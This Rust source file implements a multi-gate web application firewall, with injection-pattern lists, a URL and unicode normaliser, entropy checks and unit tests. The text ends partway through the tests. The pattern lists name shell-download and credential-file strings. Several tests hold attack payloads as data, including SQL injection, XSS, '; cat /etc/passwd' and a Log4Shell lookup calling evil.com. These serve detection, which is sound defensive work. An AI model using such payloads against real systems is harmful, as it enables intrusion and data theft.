//! Zion WAF — 5-gate request inspection pipeline (Aho-Corasick, entropy, simd-json).
//!
//! Architecture: 5-gate pipeline, fail-fast, zero-regex.
//!
//! Gate 1: Body size enforcement (O(1), no inspection)
//! Gate 2: Content-Type strict validation (zero-alloc case-insensitive)
//! Gate 3: Aho-Corasick injection scanner (SQLi/XSS/CMDi, single O(N) pass).
//!         Pattern set is selected per-profile: `Balanced` (default,
//!         high precision) or `Aggressive` (broader recall, higher FP).
//! Gate 4: Payload entropy analysis (detect obfuscated/encoded payloads).
//!         For JSON content-types the calculation is restricted to bytes
//!         inside string literals so structural punctuation does not
//!         dilute the signal. Threshold and kill-switch are per-profile.
//! Gate 5: JSON structural validation (simd-json, depth + string limits).
//!
//! Properties:
//! - Zero regex (DFA-immune to ReDoS by construction)
//! - Zero heap allocation on the fast path (GET/HEAD/DELETE/OPTIONS)
//! - Single-pass body scan via Aho-Corasick automaton
//! - All gates are O(N) or O(1) — no backtracking, no exponential blowup
//!
//! NOTE: prior versions of this header also described a sixth
//! "fixed-length profiling" gate; it was never implemented and the
//! advertisement has been removed to keep docs and code in lock-step.

use crate::config::{WafMode, WafProfile};
use aho_corasick::AhoCorasick;
use std::sync::OnceLock;

/// WAF verdict — returned from the pipeline.
#[derive(Debug, PartialEq)]
pub enum WafVerdict {
    Allow,
    Deny(&'static str),
}

// ═══════════════════════════════════════════════════════════════════
// GATE 3: Aho-Corasick Injection Scanner
// Built once at first use. Searches dozens-to-hundreds of patterns in
// O(N) over the body in a single pass.
//
// Two pattern sets:
//   * BALANCED — high-precision: tag-anchored XSS, anchored SQLi/CMDi,
//     specific SSRF endpoints, exact CVE strings (Log4Shell, XXE).
//     Default profile. Tuned to keep FP rate low for content-bearing
//     APIs (comments, code paste, docs, base64-in-JSON).
//   * AGGRESSIVE_EXTRA — adds broad, unanchored substrings
//     (`alert(`, `eval(`, `$gt`, `os.system(`, …) that catch more
//     attacks but flag legitimate developer/tooling content. Opt-in
//     via `mode = "aggressive"` on the WAF profile.
//
// Each profile gets its own automaton (built lazily, cached for the
// process lifetime). Switching costs are zero at request time — we
// just dispatch to the right `&'static AhoCorasick`.
// ═══════════════════════════════════════════════════════════════════

/// Patterns active under both `balanced` and `aggressive` modes. Anchored
/// or rare enough that false positives in real-world request bodies are
/// uncommon.
const BALANCED_PATTERNS: &[&str] = &[
    // ── SQL Injection (anchored quote/keyword combos, low FP) ──
    "' or '1'='1",
    "' or 1=1",
    "'; drop table",
    "'; delete from",
    "union select",
    "union all select",
    "1; exec ",
    "1; execute ",
    "' and '1'='1",
    "waitfor delay",
    "pg_sleep(",
    "'; shutdown",
    "information_schema",
    // ── XSS: Tags (anchored on `<`) ──
    "<script",
    "</script",
    "<iframe",
    "<object",
    "<embed",
    "<svg onload",
    "<img src",
    "<body onload",
    "<input onfocus",
    "<details ontoggle",
    "<video onerror",
    "<audio onerror",
    "<marquee onstart",
    "<math xlink",
    // ── XSS: high-signal event handlers (others moved to aggressive) ──
    "onerror=",
    "onload=",
    "srcdoc=",
    "javascript:",
    // ── Command Injection (anchored: `;`, `|`, `$(`, backtick, newline) ──
    "; cat ",
    "; ls ",
    "; rm ",
    "; wget ",
    "; curl ",
    ";cat ",
    ";ls ",
    ";rm ",
    ";wget ",
    ";curl ",
    "| cat ",
    "| ls ",
    "| rm ",
    "|cat ",
    "|ls ",
    "|rm ",
    "$(cat ",
    "$(ls ",
    "`cat ",
    "`ls ",
    "\ncat ",
    "\nls ",
    "\nwget ",
    "\ncurl ",
    "/etc/passwd",
    "/etc/shadow",
    // ── Path Traversal ──
    "../../",
    "..\\..\\",
    "%2e%2e%2f",
    "%2e%2e/",
    "....//",
    // ── SSRF: cloud metadata endpoints (specific) ──
    "http://169.254.169.254",
    "https://169.254.169.254",
    "http://[::ffff:169.254",
    "http://metadata.google",
    "https://metadata.google",
    "http://100.100.100.200",
    "http://0xA9FEA9FE",
    "http://2852039166",
    "http://169.254.169.254.nip.io",
    "169.254.169.254/metadata",
    "/metadata/v1",
    "http://192.0.0.192",
    "kubernetes.default.svc",
    "/openstack/latest",
    // ── Windows Path Traversal ──
    "c:\\windows\\",
    "c:\\inetpub\\",
    "..\\..\\..\\windows",
    // ── Open Redirect ──
    "/\\evil",
    "/%09/",
    // ── LDAP Injection (parens-anchored) ──
    ")(cn=*",
    ")(uid=*",
    ")(mail=*",
    ")(objectclass=*",
    "ldap://",
    "ldaps://",
    // ── XML/XXE ──
    "<!entity",
    "<!doctype",
    "system \"file://",
    "system \"http://",
    "<xsl:",
    "xmlns:xlink",
    "<!attlist",
    "data:text/html",
    // ── SSTI ──
    "#{7*7}",
    "${7*7}",
    "{{7*7}}",
    "<%=",
    "{%import",
    "#{t(java",
    // ── CRLF / Header Injection ──
    "%0d%0a",
    "%0aset-cookie:",
    "%0alocation:",
    "\r\nset-cookie:",
    // ── Log4Shell / JNDI (specific CVE patterns) ──
    "${jndi:",
    "${env:",
    "${sys:",
    // ── Prototype pollution / template (specific) ──
    "__proto__",
    "constructor.prototype",
    // ── PHP-specific (specific URI schemes) ──
    "unserialize(",
    "php://input",
    "php://filter",
    "phar://",
    // ── GraphQL introspection (specific tokens) ──
    "{__schema",
    "{__type",
    "query{__",
];

/// Patterns added on top of BALANCED when `mode = "aggressive"`. These
/// catch more attacks but DO flag legitimate developer/code/educational
/// content. Use only on routes where the FP rate is tolerable (admin
/// panels, internal tooling), never on user-content APIs without measuring.
const AGGRESSIVE_EXTRA_PATTERNS: &[&str] = &[
    // ── SQLi: function calls / token reads (FP in BI tools, dump status) ──
    "sleep(",
    "benchmark(",
    "into outfile",
    "into dumpfile",
    "load_file(",
    "@@version",
    "char(0x",
    // ── XSS: low-anchor event handlers (FP on any code-bearing payload) ──
    "onfocus=",
    "onmouseover=",
    "onclick=",
    "oninput=",
    "onchange=",
    "onsubmit=",
    "onkeydown=",
    "onkeyup=",
    "onkeypress=",
    "ondblclick=",
    "oncontextmenu=",
    "ondragstart=",
    "ondrop=",
    "onpaste=",
    "ontouchstart=",
    "onpointerover=",
    "onanimationend=",
    "ontransitionend=",
    "onresize=",
    "onscroll=",
    "onwheel=",
    "onmouseenter=",
    "ontoggle=",
    "onpageshow=",
    // ── XSS: JS API sinks (heavy FP in MDN-style docs / code paste) ──
    "expression(",
    "alert(",
    "confirm(",
    "prompt(",
    "document.cookie",
    "document.write",
    "document.domain",
    "window.location",
    "eval(",
    "fromcharcode",
    "innerhtml",
    "outerhtml",
    "insertadjacenthtml",
    // ── Command injection: Windows tokens (FP in event-log shipping) ──
    "cmd.exe",
    "powershell",
    // ── NoSQL ops (no delimiter — `{"id":"$gt-23"}` falsely matches) ──
    "$gt",
    "$ne",
    "$regex",
    "$where",
    "$lookup",
    "$unionwith",
    "db.collection",
    ".find({",
    ".findone({",
    ".aggregate([",
    ".mapreduce(",
    "this.constructor",
    "{{constructor",
    "{{.constructor",
    // ── Deserialization / RCE: language-class-name patterns ──
    // (FP whenever an APM/error reporter forwards a stack trace)
    "runtime.getruntime",
    "processbuilder",
    "objectinputstream",
    "java.lang.runtime",
    "javax.script.scriptengine",
    "pickle.loads",
    "__reduce__",
    "__import__(",
    "subprocess.call",
    "subprocess.popen",
    "os.system(",
    "os.popen(",
    // ── GraphQL: lone introspection tokens (also appear in legit schemas) ──
    "__schema",
    "__type",
    "mutation{",
];

static BALANCED_SCANNER: OnceLock<AhoCorasick> = OnceLock::new();
static AGGRESSIVE_SCANNER: OnceLock<AhoCorasick> = OnceLock::new();

#[inline]
fn build_scanner(patterns: &[&str]) -> AhoCorasick {
    AhoCorasick::builder()
        .ascii_case_insensitive(true)
        .build(patterns)
        .expect("Failed to build Aho-Corasick automaton")
}

fn balanced_scanner() -> &'static AhoCorasick {
    BALANCED_SCANNER.get_or_init(|| build_scanner(BALANCED_PATTERNS))
}

fn aggressive_scanner() -> &'static AhoCorasick {
    AGGRESSIVE_SCANNER.get_or_init(|| {
        let mut all: Vec<&str> =
            Vec::with_capacity(BALANCED_PATTERNS.len() + AGGRESSIVE_EXTRA_PATTERNS.len());
        all.extend_from_slice(BALANCED_PATTERNS);
        all.extend_from_slice(AGGRESSIVE_EXTRA_PATTERNS);
        build_scanner(&all)
    })
}

#[inline]
fn scanner_for(mode: WafMode) -> &'static AhoCorasick {
    match mode {
        WafMode::Balanced => balanced_scanner(),
        WafMode::Aggressive => aggressive_scanner(),
    }
}

// ═══════════════════════════════════════════════════════════════════
// GATE 4: Entropy Analysis
// Shannon entropy is a heuristic for "this body looks like obfuscated /
// encrypted / packed content rather than human text or normal JSON."
//
// Reference points (bits/byte):
//   * English / source code:       ~3.5–4.7
//   * JSON struct (with keys):     ~3.5–5.5
//   * Pure base64 (max theoretic): 6.0
//   * JWT / signed URL:            5.5–6.0
//   * Random / encrypted blob:     7.5–8.0
//
// The previous default (5.5) flagged any base64 / JWT in a request body —
// a foot-gun for APIs that legitimately accept signed payloads. The new
// default is 6.5, with a per-profile override (`entropy_threshold`) and
// a kill-switch (`entropy_check`).
//
// For JSON bodies we additionally restrict the calculation to the bytes
// inside string literals (keys + values, excluding structural punctuation
// and numeric literals), so low-entropy structural bytes don't dilute the
// signal.
// ═══════════════════════════════════════════════════════════════════

/// Unified WAF Normalizer (Single-Pass, Zero-Alloc)
/// Replaces recursive Cow allocations with a fast byte-by-byte state machine.
/// Normalizes:
/// - URL encoding (%XX and +)
/// - JSON unicode escapes (\uXXXX)
/// - SQL inline comments (/* ... */) -> space
fn normalize_unified(input: &[u8], out: &mut Vec<u8>) {
    out.clear();
    let len = input.len();
    let mut i = 0;
    let mut in_sql_comment = false;

    while i < len {
        // 1. SQL Comment Stripping State
        if in_sql_comment {
            if i + 1 < len && input[i] == b'*' && input[i + 1] == b'/' {
                in_sql_comment = false;
                i += 2;
                if out.last() != Some(&b' ') {
                    out.push(b' '); // Pad with space to block `1/*comment*/OR` concat
                }
            } else {
                i += 1;
            }
            continue;
        }

        if i + 1 < len && input[i] == b'/' && input[i + 1] == b'*' {
            in_sql_comment = true;
            i += 2;
            continue;
        }

        let b = input[i];

        // 2. URL Decode State
        if b == b'+' {
            out.push(b' ');
            i += 1;
            continue;
        } else if b == b'%' && i + 2 < len {
            if let (Some(hi), Some(lo)) = (hex_val(input[i + 1]), hex_val(input[i + 2])) {
                out.push((hi << 4) | lo);
                i += 3;
                continue;
            }
        }

        // 3. JSON Unicode State
        if b == b'\\' && i + 5 < len && input[i + 1] == b'u' {
            if let (Some(h1), Some(h2), Some(h3), Some(h4)) = (
                hex_val(input[i + 2]),
                hex_val(input[i + 3]),
                hex_val(input[i + 4]),
                hex_val(input[i + 5]),
            ) {
                let codepoint =
                    ((h1 as u16) << 12) | ((h2 as u16) << 8) | ((h3 as u16) << 4) | (h4 as u16);

                if codepoint <= 0xFF {
                    out.push(codepoint as u8);
                } else {
                    let mut utf8_buf = [0u8; 3];
                    let ch = char::from_u32(codepoint as u32).unwrap_or('?');
                    out.extend_from_slice(ch.encode_utf8(&mut utf8_buf).as_bytes());
                }
                i += 6;
                continue;
            }
        }

        // 4. Default: push lowercase byte for case-insensitive normalization
        out.push(b.to_ascii_lowercase());
        i += 1;
    }
}

#[inline]
fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Calculate Shannon entropy of a byte slice (bits per byte).
/// 0.0 = constant; 8.0 = perfectly random. Caller guarantees data.len() ≥ 1.
#[inline]
fn shannon_entropy(data: &[u8]) -> f64 {
    let mut freq = [0u32; 256];
    for &b in data {
        freq[b as usize] += 1;
    }

    let inv_len = 1.0 / data.len() as f64;
    let mut entropy = 0.0f64;
    for &count in &freq {
        if count > 0 {
            let p = count as f64 * inv_len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Shannon entropy computed only over bytes inside JSON string literals.
///
/// Walks the JSON byte-by-byte (no allocation, no parse), accumulating
/// frequencies for every byte seen between matching `"` delimiters. Skips
/// structural bytes (`{`, `[`, `,`, `:`, whitespace) and numeric/literal
/// tokens, all of which are low-entropy and would otherwise dilute the
/// signal of an obfuscated payload hidden inside a single string value.
///
/// `\` escape sequences are honoured (the next byte is treated as inside
/// the string and not as a closing `"`). `\uXXXX` is consumed as 5 escape
/// bytes after the `\` — we don't decode it; this is a heuristic, not a
/// validator.
///
/// Returns `None` when fewer than `min_sample` total string bytes were
/// observed — too small a sample to draw a meaningful conclusion (and the
/// caller already enforces a 256-byte body floor before invoking the
/// entropy gate, so this only triggers on JSON that is mostly structure).
fn shannon_entropy_json_strings(body: &[u8], min_sample: usize) -> Option<f64> {
    let mut freq = [0u32; 256];
    let mut total: usize = 0;
    let mut in_string = false;
    let mut escaped = false;

    for &b in body {
        if escaped {
            escaped = false;
            if in_string {
                freq[b as usize] += 1;
                total += 1;
            }
            continue;
        }
        if in_string {
            if b == b'\\' {
                escaped = true;
            } else if b == b'"' {
                in_string = false;
            } else {
                freq[b as usize] += 1;
                total += 1;
            }
        } else if b == b'"' {
            in_string = true;
        }
        // bytes outside strings (structure, numbers, whitespace) are skipped
    }

    if total < min_sample {
        return None;
    }
    let inv = 1.0 / total as f64;
    let mut entropy = 0.0f64;
    for &c in &freq {
        if c > 0 {
            let p = c as f64 * inv;
            entropy -= p * p.log2();
        }
    }
    Some(entropy)
}

// ═══════════════════════════════════════════════════════════════════
// GATE 5: JSON Structural Validation (manual byte-scan)
// No serde_json deserialization — walk the raw bytes to check:
//   - Valid JSON structure
//   - Nesting depth <= max_depth
//   - String length <= max_string_len
// ═══════════════════════════════════════════════════════════════════

// Thread-local buffer pool for simd-json and WAF zero-allocation parsing.
// Eliminates per-request heap allocation for the mutable buffer that
// simd-json and Aho-Corasick normalization require. Buffer is reused.
thread_local! {
    static JSON_BUF: std::cell::RefCell<Vec<u8>> = std::cell::RefCell::new(Vec::with_capacity(8192));
    static WAF_BUF_SEC: std::cell::RefCell<Vec<u8>> = std::cell::RefCell::new(Vec::with_capacity(8192));
}

fn validate_json_structure(body: &[u8], max_depth: usize, max_string_len: usize) -> WafVerdict {
    // Use thread-local buffer pool to avoid per-request allocation.
    // simd-json needs a mutable buffer — we copy body into the pooled buffer.
    let valid = JSON_BUF.with(|buf| {
        let mut buf = buf.borrow_mut();
        buf.clear();
        buf.extend_from_slice(body);
        // to_owned_value avoids the lifetime issue — the parsed value is owned
        // and dropped at the end of this closure, not tied to the buffer.
        simd_json::to_owned_value(&mut *buf).is_ok()
    });
    if !valid {
        return WafVerdict::Deny("malformed JSON");
    }

    // Depth + string length check via manual byte scan (zero-alloc)
    if !check_depth_and_strings_raw(body, max_depth, max_string_len) {
        return WafVerdict::Deny("JSON exceeds depth or string length limits");
    }

    WafVerdict::Allow
}

/// Raw byte scan for depth and string length — no deserialization needed.
/// Walks the JSON bytes counting { [ for depth and measuring " strings.
fn check_depth_and_strings_raw(body: &[u8], max_depth: usize, max_string_len: usize) -> bool {
    let mut depth: usize = 0;
    let mut in_string = false;
    let mut string_len: usize = 0;
    let mut escaped = false;

    for &b in body {
        if escaped {
            escaped = false;
            if in_string {
                string_len += 1;
            }
            continue;
        }

        if b == b'\\' {
            escaped = true;
            continue;
        }

        if in_string {
            if b == b'"' {
                // End of string
                if string_len > max_string_len {
                    return false;
                }
                in_string = false;
                string_len = 0;
            } else {
                string_len += 1;
            }
        } else {
            match b {
                b'"' => {
                    in_string = true;
                    string_len = 0;
                }
                b'{' | b'[' => {
                    depth += 1;
                    if depth > max_depth {
                        return false;
                    }
                }
                b'}' | b']' => {
                    depth = depth.saturating_sub(1);
                }
                _ => {}
            }
        }
    }

    true
}

// ═══════════════════════════════════════════════════════════════════
// MAIN PIPELINE
// ═══════════════════════════════════════════════════════════════════

/// Validate an incoming request through the 5-gate WAF pipeline.
/// Each gate is fail-fast: first deny wins, no further inspection.
#[inline]
pub fn validate_request(
    method: &str,
    content_type: Option<&str>,
    body: &[u8],
    profile: &WafProfile,
) -> WafVerdict {
    // ── Gate 1: Body size (O(1)) ──
    let max_body_bytes = profile.max_body_mb * 1_048_576;
    if body.len() as u64 > max_body_bytes {
        return WafVerdict::Deny("body exceeds max size");
    }

    // Methods without body semantics: skip body inspection.
    // DELETE can carry a body (RFC 9110) — some APIs use it.
    if !matches!(method, "POST" | "PUT" | "PATCH" | "DELETE") {
        return WafVerdict::Allow;
    }

    if body.is_empty() {
        return WafVerdict::Allow;
    }

    // ── Gate 2: Content-Type (zero-alloc case-insensitive) ──
    let is_json = match content_type {
        Some(ct) => {
            // Prefix match with delimiter check: "application/json" must be
            // followed by EOF, ';' (charset), or ' ' — not arbitrary chars.
            // Without this, "application/jsonFOO" would be treated as allowed.
            let is_allowed = profile.allowed_content_types.iter().any(|allowed| {
                if ct.len() < allowed.len() {
                    return false;
                }
                if !ct.as_bytes()[..allowed.len()].eq_ignore_ascii_case(allowed.as_bytes()) {
                    return false;
                }
                // Must be exact match or followed by a parameter delimiter
                ct.len() == allowed.len()
                    || ct.as_bytes()[allowed.len()] == b';'
                    || ct.as_bytes()[allowed.len()] == b' '
            });

            if !is_allowed {
                if profile.deny_unknown_content_types {
                    return WafVerdict::Deny("unexpected content-type for API request");
                }
                return WafVerdict::Allow;
            }

            ct.as_bytes()
                .get(..16)
                .map(|b| b.eq_ignore_ascii_case(b"application/json"))
                .unwrap_or(false)
        }
        None => return WafVerdict::Deny("missing content-type header"),
    };

    // ── Gate 3: Aho-Corasick injection scan (O(N), single pass) ──
    // Profile-driven scanner: balanced (default) or aggressive.
    let scanner = scanner_for(profile.mode);

    // Scan raw body first (fast path — no alloc if no encoding present).
    if scanner.is_match(body) {
        return WafVerdict::Deny("injection pattern detected");
    }

    // Normalized scan: URL-decode, strip SQL comments, normalize JSON unicode.
    // Each layer prevents a different evasion class:
    //   - url_decode: %27, %3C, %2F, + → space
    //   - strip_sql_comments: union/**/select → union select
    //   - normalize_json_unicode: \u0027 → ', \u003c → <
    let needs_decode = memchr::memchr(b'%', body).is_some() || memchr::memchr(b'+', body).is_some();
    let has_sql_comments = body.windows(2).any(|w| w == b"/*");
    let has_unicode_esc = body.windows(2).any(|w| w == b"\\u");

    if needs_decode || has_sql_comments || has_unicode_esc {
        let verdict = JSON_BUF.with(|buf1| {
            WAF_BUF_SEC.with(|buf2| {
                let mut out = buf1.borrow_mut();
                let mut sec = buf2.borrow_mut();

                // First pass from body -> out
                normalize_unified(body, &mut out);

                // Iterate until convergence or safety cap.
                // 2 iterations catches double/triple encoding (real-world max).
                // Convergence check breaks early if no further decoding is needed.
                for _ in 0..2 {
                    if scanner.is_match(out.as_slice()) {
                        return Some(WafVerdict::Deny("injection pattern detected (encoded)"));
                    }

                    let still_needs_decode = memchr::memchr(b'%', &out).is_some()
                        || memchr::memchr(b'+', &out).is_some();
                    let still_has_sql_comments = out.windows(2).any(|w| w == b"/*");
                    let still_has_unicode_esc = out.windows(2).any(|w| w == b"\\u");

                    if !still_needs_decode && !still_has_sql_comments && !still_has_unicode_esc {
                        break;
                    }

                    // Recursive pass: out -> sec, then swap
                    normalize_unified(&out, &mut sec);

                    // If output didn't change, we've converged — stop
                    if *out == *sec {
                        break;
                    }

                    std::mem::swap(&mut *out, &mut *sec);
                }

                // Final check after convergence
                if scanner.is_match(out.as_slice()) {
                    return Some(WafVerdict::Deny("injection pattern detected (encoded)"));
                }

                // Shrink inflated buffers to prevent OOM from adversarial large bodies.
                // A single 10MB POST would permanently inflate all worker threads.
                if out.capacity() > 65_536 {
                    out.shrink_to(8192);
                }
                if sec.capacity() > 65_536 {
                    sec.shrink_to(8192);
                }
                None
            })
        });

        if let Some(v) = verdict {
            return v;
        }
    }

    // ── Gate 4: Entropy analysis (detect obfuscated payloads) ──
    // Only scan bodies ≥ 256 bytes (smaller payloads lack a meaningful
    // sample). For JSON content-types, restrict the calculation to bytes
    // inside string literals so structural punctuation and numeric
    // tokens don't dilute the signal. Threshold and kill-switch are
    // per-profile (`entropy_threshold`, `entropy_check`).
    if profile.entropy_check && body.len() >= 256 {
        let entropy = if is_json {
            // Need ≥128 string-content bytes to draw a conclusion. If the
            // JSON is mostly structure (nested arrays of numbers, etc.),
            // skip the gate rather than report a misleading reading.
            shannon_entropy_json_strings(body, 128)
        } else {
            Some(shannon_entropy(body))
        };
        if let Some(e) = entropy {
            if e > profile.entropy_threshold {
                return WafVerdict::Deny("suspicious payload entropy");
            }
        }
    }

    // ── Gate 5: JSON structural validation ──
    if is_json {
        return validate_json_structure(body, profile.max_depth, profile.max_string_len);
    }

    WafVerdict::Allow
}

/// Validate a request URI (path + query string) through the injection scanner.
/// Called for ALL methods to catch SQLi/XSS in query parameters.
/// Zero cost if no patterns match (single O(N) pass).
///
/// Mode comes from the route's WAF profile so URI scanning matches body
/// scanning: a route in `balanced` mode won't deny a query string that
/// only the `aggressive` pattern set would catch.
#[inline]
pub fn validate_uri(uri: &str, mode: WafMode) -> WafVerdict {
    let scanner = scanner_for(mode);

    // Scan raw URI
    if scanner.is_match(uri.as_bytes()) {
        return WafVerdict::Deny("injection pattern in URI");
    }
    // Normalized URI scan: URL-decode + SQL comment strip + JSON unicode
    let uri_bytes = uri.as_bytes();
    let needs_decode =
        memchr::memchr(b'%', uri_bytes).is_some() || memchr::memchr(b'+', uri_bytes).is_some();
    let has_sql_comments = uri_bytes.windows(2).any(|w| w == b"/*");

    if needs_decode || has_sql_comments {
        let verdict = JSON_BUF.with(|buf1| {
            WAF_BUF_SEC.with(|buf2| {
                let mut out = buf1.borrow_mut();
                let mut sec = buf2.borrow_mut();

                normalize_unified(uri_bytes, &mut out);

                for _ in 0..2 {
                    if scanner.is_match(out.as_slice()) {
                        return Some(WafVerdict::Deny("injection pattern in URI (encoded)"));
                    }

                    let still_needs_decode = memchr::memchr(b'%', &out).is_some()
                        || memchr::memchr(b'+', &out).is_some();
                    let still_has_sql_comments = out.windows(2).any(|w| w == b"/*");
                    let still_has_unicode_esc = out.windows(2).any(|w| w == b"\\u");

                    if !still_needs_decode && !still_has_sql_comments && !still_has_unicode_esc {
                        break;
                    }

                    normalize_unified(&out, &mut sec);
                    if *out == *sec {
                        break;
                    }
                    std::mem::swap(&mut *out, &mut *sec);
                }

                if scanner.is_match(out.as_slice()) {
                    return Some(WafVerdict::Deny("injection pattern in URI (encoded)"));
                }
                None
            })
        });

        if let Some(v) = verdict {
            return v;
        }
    }
    WafVerdict::Allow
}

// ═══════════════════════════════════════════════════════════════════
// TESTS
// ═══════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    fn url_decode(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    fn strip_sql_comments(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    fn normalize_json_unicode(input: std::borrow::Cow<[u8]>) -> std::borrow::Cow<[u8]> {
        let mut out = Vec::new();
        normalize_unified(input.as_ref(), &mut out);
        std::borrow::Cow::Owned(out)
    }

    /// Default-config profile (Balanced mode, entropy gate on at 6.5).
    /// Historically called `strict` — the name is kept to minimise diff
    /// noise in existing assertions; semantics now match the runtime
    /// default a real deployment will see.
    fn strict_profile() -> WafProfile {
        WafProfile::default()
    }

    /// Aggressive-mode profile: balanced patterns plus broad-substring
    /// patterns (alert(, eval(, $gt, os.system(, …). Body inspection is
    /// otherwise unchanged.
    fn aggressive_profile() -> WafProfile {
        WafProfile {
            mode: WafMode::Aggressive,
            ..WafProfile::default()
        }
    }

    fn relaxed_profile() -> WafProfile {
        WafProfile {
            max_body_mb: 100,
            max_depth: 20,
            max_string_len: 10_485_760,
            deny_unknown_content_types: false,
            allowed_content_types: vec![
                "application/json".to_string(),
                "multipart/form-data".to_string(),
                "application/xml".to_string(),
            ],
            ..WafProfile::default()
        }
    }

    // ── Gate 1: Body size ──

    #[test]
    fn allows_valid_json() {
        let body = br#"{"username":"admin","password":"secret123"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn denies_oversized_body() {
        let body = vec![0u8; 1000];
        let mut p = strict_profile();
        p.max_body_mb = 0;
        assert_eq!(
            validate_request("POST", Some("application/json"), &body, &p),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    #[test]
    fn denies_body_size_zero_mb_limit() {
        let profile = WafProfile {
            max_body_mb: 0,
            ..WafProfile::default()
        };
        assert_eq!(
            validate_request("POST", Some("application/json"), b"x", &profile),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    #[test]
    fn get_with_oversized_body_still_checked() {
        let body = vec![0u8; 1000];
        let mut p = strict_profile();
        p.max_body_mb = 0;
        assert_eq!(
            validate_request("GET", None, &body, &p),
            WafVerdict::Deny("body exceeds max size")
        );
    }

    // ── Gate 2: Content-Type ──

    #[test]
    fn denies_missing_content_type() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request("POST", None, body, &strict_profile()),
            WafVerdict::Deny("missing content-type header")
        );
    }

    #[test]
    fn strict_denies_unknown_content_type() {
        let body = b"<xml>data</xml>";
        assert_eq!(
            validate_request("POST", Some("application/xml"), body, &strict_profile()),
            WafVerdict::Deny("unexpected content-type for API request")
        );
    }

    #[test]
    fn relaxed_allows_unknown_content_type() {
        let body = b"<xml>data</xml>";
        assert_eq!(
            validate_request("POST", Some("application/xml"), body, &relaxed_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn content_type_case_insensitive() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request("POST", Some("Application/JSON"), body, &strict_profile()),
            WafVerdict::Allow
        );
    }

    #[test]
    fn content_type_with_charset() {
        let body = br#"{"a":1}"#;
        assert_eq!(
            validate_request(
                "POST",
                Some("application/json; charset=utf-8"),
                body,
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    #[test]
    fn allows_multipart() {
        let body = b"--boundary\r\nContent-Disposition: form-data\r\n\r\ndata";
        assert_eq!(
            validate_request(
                "POST",
                Some("multipart/form-data; boundary=abc"),
                body,
                &strict_profile()
            ),
            WafVerdict::Allow
        );
    }

    // ── Gate 3: Injection scanner ──

    #[test]
    fn denies_sql_injection() {
        let body = br#"{"user":"admin' OR '1'='1","pass":"x"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_xss() {
        let body = br#"{"name":"<script>alert(1)</script>"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_command_injection() {
        let body = br#"{"file":"; cat /etc/passwd"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_path_traversal() {
        let body = br#"{"path":"../../../etc/passwd"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_ssrf_aws_metadata() {
        let body = br#"{"url":"http://169.254.169.254/latest/meta-data/"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_log4shell() {
        let body = br#"{"header":"${jndi:ldap://evil.com/a}"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_prototype_pollution() {
        let body = br#"{"__proto__":{"admin":true}}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected")
        );
    }

    #[test]
    fn denies_url_encoded_sqli() {
        // %27 = ', %4F = O, %52 = R — URL-encoded SQL injection
        let body = br#"{"user":"admin%27 OR %271%27=%271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_url_encoded_xss() {
        // %3C = <, %3E = >, %61lert = alert — fully encoded to evade raw scan
        let body = br#"{"name":"%3Cscript%3E%61lert(1)%3C/script%3E"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_double_url_encoded_sqli() {
        // %2527 → %27 → ' (double encoded)
        let body = br#"{"user":"admin%2527 OR %25271%2527=%25271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn denies_triple_url_encoded_sqli() {
        // %252527 → %2527 → %27 → ' (triple encoded)
        let body = br#"{"user":"admin%252527 OR %2525271%252527=%2525271"}"#;
        assert_eq!(
            validate_request("POST", Some("application/json"), body, &strict_profile()),
            WafVerdict::Deny("injection pattern detected (encoded)")
        );
    }

    #[test]
    fn aggressive_denies_quadruple_url_encoded_xss() {
        // %25253C → %253C → %3C → < requires 4 normalisation passes; the
        // decode loop performs at most 3, so the *encoded* `<script` part
        // is not what catches this body. The raw `alert(` literal does —
        // and `alert(` lives in the AGGRESSIVE pattern set. This test pins
        // that aggressive mode picks it up; balanced will not (covered by
        // `balanced_allows_quadruple_url_encoded_xss` below).
        let body = br#"{"html":"%2525253Cscript%2525253Ealert(1)"}"#;
        let result = validate_request(
            "POST",
